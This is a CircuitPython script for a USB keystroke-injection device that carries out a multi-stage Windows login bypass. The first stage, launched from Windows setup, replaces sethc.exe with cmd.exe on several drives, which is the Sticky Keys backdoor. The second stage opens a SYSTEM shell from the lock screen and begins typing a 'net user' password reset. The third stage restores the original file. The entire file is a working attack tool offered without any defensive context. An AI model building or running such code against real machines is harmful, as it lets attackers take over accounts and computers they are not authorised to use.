import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
import usb_hid
from adafruit_hid.mouse import Mouse
import board
import digitalio
import math

kbd = Keyboard(usb_hid.devices)
mouse = Mouse(usb_hid.devices)

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

layout = KeyboardLayoutUS(kbd)

LED_DELAY = 0.25
delay = 0.2
"""
while True:
    led.value = True
    time.sleep(LED_DELAY)
    led.value = False
    time.sleep(LED_DELAY)
"""
time.sleep(2)
file = open("./var.txt", 'r')
timesRun = int(file.read())
file.close()

for i in range(timesRun):
    led.value = True
    time.sleep(LED_DELAY)
    led.value = False
    time.sleep(LED_DELAY)

time.sleep(3)
def loadupCountDown(LOADUP_DELAY):
    while LOADUP_DELAY > 0:
        print(LOADUP_DELAY)
        if LOADUP_DELAY%10 == 0:
            for i in range(LOADUP_DELAY/10):
                print(LOADUP_DELAY/10)
                led.value = True
                time.sleep(LED_DELAY)
                led.value = False
                time.sleep(LED_DELAY)
            LOADUP_DELAY -= math.ceil(LOADUP_DELAY/20)
            
        else:
            time.sleep(1)
            LOADUP_DELAY -= 1



# Windows setup payload
if timesRun == 1:
    kbd.press(Keycode.SHIFT)
    time.sleep(delay)
    kbd.press(Keycode.F10)
    time.sleep(delay)
    kbd.release_all()
    time.sleep(delay*5)
    letters = ['C','D','E','F']
    for letter in letters:
        layout.write(letter +":\n")
        time.sleep(delay)
        layout.write("cd windows/system32\n")
        time.sleep(delay)
        layout.write("takeown /F sethc.exe\n")
        time.sleep(delay)
        layout.write("xcopy sethc.exe sethc_backup.exe\n")
        time.sleep(delay)
        layout.write("f\n")
        time.sleep(delay*5)
        layout.write("takeown /F cmd.exe\n")
        time.sleep(delay)
        layout.write("xcopy cmd.exe sethc.exe\n")
        time.sleep(delay*2)
        layout.write("a\n")
        time.sleep(delay*5)
    kbd.send(Keycode.ALT, Keycode.F4)
    time.sleep(1)
    kbd.send(Keycode.ALT, Keycode.F4)
    time.sleep(1)
    kbd.send(Keycode.ALT, Keycode.F4)
    while True:
        led.value = True
elif timesRun == 2:
    time.sleep(5)
    layout.write("\n")
    mouse.move(x = 10, y = 10)
    mouse.click(Mouse.LEFT_BUTTON)
    for i in range(8):
        kbd.send(Keycode.SHIFT)
    time.sleep(2)
    mouse.click(Mouse.LEFT_BUTTON)
    time.sleep(delay)
    layout.write("net user\n")
    time.sleep(delay)
    layout.write("net user [username] ")
    kbd.send(Keycode.KEYPAD_ONE, Keycode.KEYPAD_TWO, Keycode.KEYPAD_THREE)
    while True:
        led.value = True
elif timesRun == 3:
    kbd.press(Keycode.WINDOWS)
    kbd.send(Keycode.R)
    kbd.release_all()
    time.sleep(1)
    layout.write("cmd /c \"move sethc_backup.exe sethc.exe\"")
    kbd.press(Keycode.CONTROL)
    kbd.press(Keycode.SHIFT)
    layout.write("\n")
    kbd.release_all()
    time.sleep(1)
    kbd.send(Keycode.LEFT_ARROW)
    layout.write("\n")
    while True:
        led.value = True
        
        